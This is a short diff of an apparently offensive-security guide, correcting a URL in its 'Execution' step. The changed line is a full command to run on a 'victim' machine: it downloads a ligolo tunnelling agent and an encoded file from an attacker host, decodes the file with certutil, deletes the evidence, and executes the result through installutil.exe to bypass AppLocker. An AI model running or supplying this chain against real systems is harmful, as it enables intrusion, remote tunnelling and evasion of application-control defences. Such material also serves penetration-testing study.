@@ -16,4 +16,4 @@
   - Make sure both executable and the encoded .txt file in the same directory, then serve them with python server.
 
 ### <ins/>Step 5: Execution in Action!<ins/> 
-  - On victim, run: `cmd.exe /c curl http://192.168.45.185/ligolo-agent.exe -o C:\users\public\try-agent.exe && curl http://192.168.45.185/  AppLockerBypassLigolo.txt -o C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe`
+  - On victim, run: `cmd.exe /c curl http://192.168.45.185/ligolo-agent.exe -o C:\users\public\try-agent.exe && curl http://192.168.45.185/AppLockerBypassLigolo.txt -o C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe`
